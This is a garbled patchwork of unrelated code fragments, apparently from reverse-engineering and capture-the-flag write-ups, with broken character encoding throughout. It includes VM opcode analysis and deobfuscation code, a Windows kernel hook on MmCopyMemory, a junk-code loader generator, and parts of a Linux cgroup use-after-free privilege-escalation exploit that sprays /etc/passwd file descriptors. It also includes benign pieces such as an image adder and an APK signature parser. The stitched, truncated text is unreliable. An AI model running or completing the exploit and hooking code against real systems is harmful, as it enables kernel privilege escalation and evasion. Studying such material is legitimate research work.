import struct
pcode_start = 0xB090
pcode_size = 0x2D8
with open("libEncryptor.so", "rb") as f:Â  Â Â  Â Â Â content = f.read()bytes_code = content[pcode_start : pcode_start + pcode_size]insts_sets = {}
for pc in range(0, pcode_size, 4):
Â  Â  word = struct.unpack("<I", bytes_code[pc : pc + 4])Â Â 
Â  Â  if len(word) > 0:
Â  Â Â  Â Â Â opcode = word[0]
Â  Â Â  Â Â Â op1 = opcode & 0x3F
Â  Â Â  Â Â Â if insts_sets.get(op1, None) == None:
Â  Â Â  Â Â  Â Â  Â  insts_sets[op1] = 1
Â  Â Â  Â Â Â else:
Â  Â Â  Â Â  Â Â  Â  insts_sets[op1] += 1
sorted_dict = dict(sorted(insts_sets.items(), key=lambda item: item[1], reverse=True))
for inst, count in sorted_dict.items():
Â  Â Â Â print(f'op1: {inst}, count: {count}')

private Set<List<Instruction>> controlNodes = new HashSet<>();

public void splitBlockToControlAndReal(boolean isFirst) {
Â  Â  // ç”±äºè¡¥å……äº†æ–°çš„åˆ†å—ï¼Œéœ€è¦è¿›è¡Œé‡ç½®äº†
Â  Â  controlNodes = new HashSet<>();

Â  Â  for (Instruction ins : toMap.get(preDispather.get(preDispather.size() - 1).getAddress())) {Â  Â Â  Â Â Â List<Instruction> toBlock = getMergeNodeByStart(ins.getAddress());Â  Â Â  Â Â Â controlNodes.add(toBlock);

Â  Â Â  Â Â  Â Â  Â String[] regs = matched.get(2).getOpStr().split(",");
Â  Â Â  Â Â  Â Â  Â reg = otherReg.equals(regs[0].trim())
Â  Â Â  Â Â  Â Â  Â Â  Â  ? regs[1].trim()
Â  Â Â  Â Â  Â Â  Â Â  Â  : regs[0].trim();

Â  Â  if (reg == null)
Â  Â Â  Â Â Â throw new RuntimeException("flag reg is null");
Â  Â  System.out.println("flag reg: " + reg);Â  Â  System.out.println(mergedNodes.size());

Â  Â Â  Â Â Â if (matched != null) {Â  Â Â  Â Â  Â Â  Â controlNodes.add(block);

Â  Â  for (List<Instruction> block: mergedNodes) {
Â  Â Â  Â Â Â if (!controlNodes.contains(block)) {Â  Â Â  Â Â  Â Â  Â realNodes.add(block);Â  Â Â  Â Â Â }Â  Â  }
Â  Â  System.out.println("control block " + controlNodes.size());
Â  Â  System.out.println("real block " + realNodes.size());
}

Â  Â  while (!pending.empty()) {

Â  Â  if (assign != null) {

Â  Â  if (outBlockNum > 1) {

}

private Instruction allocBlock(List<Instruction> common, int size, Map<Long, String> patchInfo, Map<Long, Long> copyBlock) {
Â  Â  // ...
Â  Â  // å€’ç€åˆ†é…
Â  Â  Instruction lastAlloc = null;
Â  Â  int rest = size;
Â  Â  // å¯¹äºæ²¡æœ‰ä¸€ä¸ªåŒºå—èƒ½æ»¡è¶³çš„
Â  Â  for (List<Instruction> controlNode : controlNodes) {
Â  Â Â  Â Â Â // è¿™é‡Œéœ€è¦é¿å…entryä¹‹åçš„æ§åˆ¶å—è¢«åˆ†é…äº†ï¼Œå› ä¸ºå®ƒå¯èƒ½æ˜¯æ¥ç€çš„ï¼Œæ˜¯æ²¡æœ‰è·³è½¬æŒ‡ä»¤æ¥è¦†ç›–çš„
Â  Â Â  Â Â Â // è¿™ä¸ªæ§åˆ¶å—ä¸€èˆ¬æ˜¯preDispatcherçš„åç»§
Â  Â Â  Â Â Â List<Instruction> from = fromMap.get(controlNode.get(0).getAddress());
Â  Â Â  Â Â Â boolean isLinkEntry = false;
Â  Â Â  Â Â Â for (Instruction f : from)
Â  Â Â  Â Â  Â Â  Â if (f.getAddress() == preDispather.get(preDispather.size() - 1).getAddress())
Â  Â Â  Â Â  Â Â  Â Â  Â  isLinkEntry = true;
Â  Â Â  Â Â Â if (isLinkEntry)
Â  Â Â  Â Â  Â Â  Â continue;
Â  Â Â  Â Â Â // size - common.size() æ˜¯commonå—ä¹‹å¤–çš„ï¼Œä¼šæœ‰ç‚¹å¯¹ä¸èµ·æ¥ï¼Œæ‰€ä»¥å¾—æ‰‹åŠ¨å¤„ç†
Â  Â Â  Â Â Â // ç†è®ºä¸Šåªæœ‰ç¬¬ä¸€æ¬¡åˆ†é…ï¼Œå³åˆ†é…å°¾éƒ¨éœ€æ³¨æ„ï¼Œè¿™é‡Œç›´æ¥å…¨åšåˆ¤æ–­ï¼Œç®€å•ä¸€äº›
Â  Â Â  Â Â Â if (controlNode.size() > 1 + (size - common.size()) && !patchInfo.containsKey(controlNode.get(0).getAddress() - moduleBase) && !copyBlock.containsValue(controlNode.get(0).getAddress())) {
Â  Â Â  Â Â  Â Â  Â //Â  Â Â  Â Â  Â Â  Â Â  Â  return controlNode.get(0);
Â  Â Â  Â Â  Â Â  Â if (lastAlloc != null) {
Â  Â Â  Â Â  Â Â  Â Â  Â  patchInfo.put(controlNode.get(Math.min(controlNode.size() - 1, rest + 1)).getAddress() - moduleBase, String.format("b %d", lastAlloc.getAddress() - moduleBase));Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â lastAlloc = controlNode.get(0);
Â  Â Â  Â Â  Â Â  Â // ä¸åŒåŒºå—ä¹‹é—´éœ€è¦ä¸€ä¸ªbræŒ‡ä»¤å»è·³è½¬ä¸‹ä¸€ä¸ªallocåŒºåŸŸ
Â  Â Â  Â Â  Â Â  Â rest = rest - (controlNode.size() - 1);
Â  Â Â  Â Â  Â Â  Â if (rest <= 0) {
Â  Â Â  Â Â  Â Â  Â Â  Â  return lastAlloc;
Â  Â Â  Â Â  Â Â  Â } else
Â  Â Â  Â Â  Â Â  Â Â  Â  copyBlock.put(common.get(rest + 1).getAddress(), controlNode.get(0).getAddress());Â  Â Â  Â Â Â }Â  Â  }
Â  Â  if (rest > 0)
Â  Â Â  Â Â Â throw new RunTimeExecption("No enough control block");
Â  Â  return null;
}

for i in range(0, 7, 2):
Â  Â  v6 = flag[i+1]Â  Â  v7 = flag[i]Â  Â  a2 = k2

Â  Â Â  Â Â Â v6 &= 0xFFFFFFFF
Â  Â Â  Â Â Â v7 = v7 + 0x100000000 - (((v6 + ((v6 << 4) ^ (v6 >> 5))) ^ (key[a2&3]+a2) ^ 0x44) & 0xFFFFFFFF)
Â  Â Â  Â Â Â v7 &= 0xFFFFFFFF

Â  Â  myMmCopyMemory(
Â  Â  _In_ PVOID TargetAddress,

Â  Â  for (USHORT i = 0; i < capturedFrames; i++)

Â  Â Â  Â Â Â }
Â  Â  }

Â  Â Â  Â Â Â kprintf(("xia0ji233: calls MmCopyMemory(%p,%p,%d,%p,%p)\n"), TargetAddress, SourceAddress, NumberOfBytes, Flags, NumberOfBytesTransferred);

Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â kprintf(("\n"));
Â  Â  }

Â  Â  end:
Â  Â  Unhook();
Â  Â  Copy func = (Copy)target;
Â  Â  NTSTATUS s = func(TargetAddress, SourceAddress, NumberOfBytes, Flags, NumberOfBytesTransferred);
Â  Â  Hook();

Â  Â  return s;
}

class ELangLoaderInitGen : public CodeGenHelper {
public:
Â  Â  explicit ELangLoaderInitGen(std::optional<uint32_t> call_delta) {
Â  Â Â  Â Â Â auto regs = shuffled<Reg32>({eax, edx, ecx});
Â  Â Â  Â Â Â fillWithJunkSlideInst(rand_int(1, 5), regs);

Â  Â Â  Â Â  Â Â  Â Â  Â  [&]() { cld(); genJunk(regs); },
Â  Â Â  Â Â  Â Â  Â Â  Â  [&]() { fninit(); genJunk(regs); },
Â  Â Â  Â Â Â });
Â  Â Â  Â Â Â fillWithJunkSlideInst(rand_int(1, 5), regs);

Â  Â Â  Â Â Â bool use_ret_trick{false};
Â  Â Â  Â Â Â if (call_delta) {
Â  Â Â  Â Â  Â Â  Â use_ret_trick = next_bool();
Â  Â Â  Â Â  Â Â  Â auto reg_ret_addr = pop_last_item(regs);
Â  Â Â  Â Â  Â Â  Â mov(reg_ret_addr, dword[esp]);
Â  Â Â  Â Â  Â Â  Â genJunk(regs);
Â  Â Â  Â Â  Â Â  Â if (use_ret_trick) {
Â  Â Â  Â Â  Â Â  Â Â  Â  add(dword[esp], 3);
Â  Â Â  Â Â  Â Â  Â Â  Â  genJunk(regs);
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â auto delta_signed = static_cast<int32_t>(*call_delta);
Â  Â Â  Â Â  Â Â  Â if (delta_signed > 0) {
Â  Â Â  Â Â  Â Â  Â Â  Â  add(reg_ret_addr, delta_signed);
Â  Â Â  Â Â  Â Â  Â } else {
Â  Â Â  Â Â  Â Â  Â Â  Â  sub(reg_ret_addr, -delta_signed);
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â genJunk(regs);

Â  Â Â  Â Â  Â Â  Â if (use_ret_trick) {
Â  Â Â  Â Â  Â Â  Â Â  Â  jmp(reg_ret_addr);
Â  Â Â  Â Â  Â Â  Â } else {
Â  Â Â  Â Â  Â Â  Â Â  Â  call(reg_ret_addr);
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â Â }

Â  Â Â  Â Â Â regs = shuffled<Reg32>({eax, edx, ecx});
Â  Â Â  Â Â Â if (!use_ret_trick) {
Â  Â Â  Â Â  Â Â  Â genJunk(regs);
Â  Â Â  Â Â  Â Â  Â add(dword[esp], 3);
Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â genJunk(regs);
Â  Â Â  Â Â Â ret();

Â  Â Â  Â Â Â std::vector<uint8_t> junk(rand_int(4, 10));
Â  Â Â  Â Â Â std::generate(junk.begin(), junk.end(), mt_);
Â  Â Â  Â Â Â db(junk.data(), junk.size());
Â  Â  }
};

}

Â  Â  printf("start slow write to get the lock\n");Â  Â  int fd = open("./uaf", 1);

void *write_cmd() {

Â  Â  struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};

Â  Â  while (!run_write) {
Â  Â  }

int spray_files() {

Â  Â  while (!run_spray) {
Â  Â  }
Â  Â  int found = 0;

Â  Â  printf("got uaf fd %d, start spray....\n", uaf_fd);Â  Â  for (int i = 0; i < MAX_FILE_NUM; i++) {
Â  Â Â  Â Â Â fds[i] = open("/etc/passwd", O_RDONLY);

Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==
Â  Â Â  Â Â  Â Â  Â 0) {
Â  Â Â  Â Â  Â Â  Â found = 1;
Â  Â Â  Â Â  Â Â  Â printf("[!] found, file id %d\n", i);
Â  Â Â  Â Â  Â Â  Â for (int j = 0; j < i; j++)
Â  Â Â  Â Â  Â Â  Â Â  Â  close(fds[j]);

Â  Â  }

}

void trigger() {
Â  Â  int fs_fd = syscall(__NR_fsopen, "cgroup", 0);

Â  Â  pthread_t p_id_cmd;
Â  Â  pthread_create(&p_id_cmd, NULL, write_cmd, NULL);
Â  Â  exit(spray_files());
}

}

Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  fc->fs_type->name, param->key);

Â  Â Â  Â Â  Â Â  Â Â  Â  return invalfc(fc, "Disabled controller '%s'",
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  param->key);
Â  Â Â  Â Â  Â Â  Â ctx->subsys_mask |= (1 << i);

Â  Â  if (opt < 0)

Â  Â  switch (opt) {
Â  Â Â  Â Â Â case Opt_none:
Â  Â Â  Â Â  Â Â  Â /* Explicitly have no subsystems */
Â  Â Â  Â Â  Â Â  Â ctx->none = true;

Â  Â Â  Â Â  Â Â  Â ctx->flags |= CGRP_ROOT_CPUSET_V2_MODE;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_xattr:

Â  Â Â  Â Â  Â Â  Â ctx->release_agent = param->string;
Â  Â Â  Â Â  Â Â  Â param->string = NULL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_name:

import cv2
import os

def add_images_in_folder(folder_path):
Â  Â  # Get a list of all files in the folder
Â  Â  image_files = [f for f in os.listdir(folder_path) if f.endswith('.jpg')]

Â  Â  if len(image_files) == 0:
Â  Â Â  Â Â Â print("No JPG images found in the folder.")
Â  Â Â  Â Â Â return None

Â  Â  # Read the first image to initialize the accumulator
Â  Â  result = cv2.imread(os.path.join(folder_path, image_files[0]))

Â  Â  # Loop through the rest of the images and add them to the accumulator
Â  Â  for image_file in image_files[1:]:
Â  Â Â  Â Â Â image_path = os.path.join(folder_path, image_file)
Â  Â Â  Â Â Â image = cv2.imread(image_path)
Â  Â Â  Â Â Â result = cv2.add(result, image)

Â  Â  return result

folder_path = "./images"
result_image = add_images_in_folder(folder_path)

if result_image is not None:
Â  Â  cv2.imwrite("./result.png",result_image)

import struct
def get_v2_signature(path, verbose=True):
Â  Â  buf = open(path, 'rb').read()
Â  Â  off = 0
Â  Â  i = 0
Â  Â  # find zip's EOCD
Â  Â  while True:
Â  Â Â  Â Â Â off = len(buf) - i - 2
Â  Â Â  Â Â Â n, = struct.unpack('<H', buf[off:off+2])
Â  Â Â  Â Â Â if n == i:
Â  Â Â  Â Â  Â Â  Â off -= 20
Â  Â Â  Â Â  Â Â  Â if (struct.unpack('<I', buf[off:off+4])[0] ^ 0xcafebabe) == 0xccfbf1ee:
Â  Â Â  Â Â  Â Â  Â Â  Â  break
Â  Â Â  Â Â Â assert i < 0xffff, 'cannot find eocd'
Â  Â Â  Â Â Â i += 1
Â  Â  off += 16
Â  Â  offset, = struct.unpack('<I', buf[off:off+4])
Â  Â  off = offset - 0x18
Â  Â  # apk sig block is before the central directory starts
Â  Â  sig_block_size, = struct.unpack('<Q', buf[off:off+8])
Â  Â  off += 8
Â  Â  assert buf[off:off+0x10] == b'APK Sig Block 42', 'sig block magic mismatch'
Â  Â  off = offset - sig_block_size
Â  Â  assert struct.unpack('<Q', buf[off-8:off])[0] == sig_block_size, 'sig block size mismatch'
Â  Â  first_cert = None
Â  Â  cert_cnt = 0
Â  Â  while True:
Â  Â Â  Â Â Â cur_size, id_value = struct.unpack('<QI', buf[off:off+12])
Â  Â Â  Â Â Â if cur_size == sig_block_size:
Â  Â Â  Â Â  Â Â  Â break
Â  Â Â  Â Â Â if verbose:
Â  Â Â  Â Â  Â Â  Â print(f'offset: 0x{off:08x}, size: 0x{cur_size:08x}, id: 0x{id_value:08x}')
Â  Â Â  Â Â Â cur_off = off + 8
Â  Â Â  Â Â Â off += 12
Â  Â Â  Â Â Â if (id_value ^ 0xdeadbeef) == 0xafa439f5 or (id_value ^ 0xdeadbeef) == 0x2efed62f:
Â  Â Â  Â Â  Â Â  Â off += 4 * 3 # signer-sequence length, signer length, signed data length
Â  Â Â  Â Â  Â Â  Â off += 4 + struct.unpack('<I', buf[off:off+4])[0] # digests-sequence length, digests-sequence
Â  Â Â  Â Â  Â Â  Â off += 4 # certificates length
Â  Â Â  Â Â  Â Â  Â cert_size, = struct.unpack('<I', buf[off:off+4]) # certificate length
Â  Â Â  Â Â  Â Â  Â off += 4
Â  Â Â  Â Â  Â Â  Â cert = buf[off:off+cert_size]
Â  Â Â  Â Â  Â Â  Â base_hash = 1
Â  Â Â  Â Â  Â Â  Â for i, v in enumerate(cert):
Â  Â Â  Â Â  Â Â  Â Â  Â  base_hash = (base_hash * 31 + (v if v < 0x80 else v - 256 + 2**32)) & 0xffffffff
Â  Â Â  Â Â  Â Â  Â base_hash ^= 0x14131211
Â  Â Â  Â Â  Â Â  Â if not verbose:
Â  Â Â  Â Â  Â Â  Â Â  Â  return cert
Â  Â Â  Â Â  Â Â  Â print(f"Â  Â  size: 0x{cert_size:04x}, hash: 0x{base_hash:08x}")
Â  Â Â  Â Â  Â Â  Â if first_cert is None:
Â  Â Â  Â Â  Â Â  Â Â  Â  first_cert = cert
Â  Â Â  Â Â Â off = cur_off + cur_size
Â  Â  return first_cert

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

class Main {
Â  Â Â  Â Â Â public static byte[] getSha1(byte[] bArr) {
Â  Â Â  Â Â Â try {
Â  Â Â  Â Â  Â Â  Â return MessageDigest.getInstance("SHA").digest(bArr);
Â  Â Â  Â Â Â } catch (Exception unused) {
Â  Â Â  Â Â  Â Â  Â return null;
Â  Â Â  Â Â Â }
Â  Â  }

Â  Â  public static String md5(byte[] bArr) {
Â  Â Â  Â Â Â try {
Â  Â Â  Â Â  Â Â  Â String bigInteger = new BigInteger(1, MessageDigest.getInstance("md5").digest(bArr)).toString(16);
Â  Â Â  Â Â  Â Â  Â for (int i = 0; i < 32 - bigInteger.length(); i++) {
Â  Â Â  Â Â  Â Â  Â Â  Â  bigInteger = "0" + bigInteger;
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â return bigInteger;
Â  Â Â  Â Â Â } catch (NoSuchAlgorithmException unused) {
Â  Â Â  Â Â  Â Â  Â throw new RuntimeException("ops!!");
Â  Â Â  Â Â Â }
Â  Â  }

Â  Â  public static void main(String[] args) {
Â  Â Â  Â Â Â StringBuffer stringBuffer = new StringBuffer();
Â  Â Â  Â Â Â int i = 0;
Â  Â Â  Â Â Â while (stringBuffer.length() < 9 && i < 40) {
Â  Â Â  Â Â  Â Â  Â int i2 = i + 1;
Â  Â Â  Â Â  Â Â  Â String substring = "0485312670fb07047ebd2f19b91e1c5f".substring(i, i2);
Â  Â Â  Â Â  Â Â  Â if (!stringBuffer.toString().contains(substring)) {
Â  Â Â  Â Â  Â Â  Â Â  Â  stringBuffer.append(substring);
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â i = i2;
Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â String password = stringBuffer.toString().toUpperCase();
Â  Â Â  Â Â Â System.out.println(password);
Â  Â Â  Â Â Â System.out.println(md5(getSha1((password + "691872").getBytes())));
Â  Â  }
}

Â  Â  return {boxes, scores, classes};
}
